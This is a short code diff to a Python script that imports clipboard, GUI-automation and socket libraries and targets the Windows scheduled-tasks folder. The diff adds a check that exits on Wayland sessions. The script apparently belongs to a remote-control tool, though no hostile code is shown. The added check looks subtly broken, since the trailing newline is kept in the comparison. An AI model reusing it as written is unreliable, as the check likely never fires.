@@ -9,6 +9,7 @@ import socket
 import pyperclip
 import asyncio
 import pyautogui
+import subprocess
 
 load_dotenv()
 
@@ -22,6 +23,10 @@ if system() == "Windows":
     path = "C:\\Windows\\System32\\Tasks\\"
     home_path = os.path.expanduser("~") + "\\"
 elif system() == "Linux":
+    if subprocess.check_output("echo $XDG_SESSION_TYPE", shell=True).decode("utf-8") == "wayland":
+        print("wayland found, exiting")
+        exit()
+
     isWindows = False
     path = "/var/tmp/"
     home_path = os.path.expanduser("~") + "/"
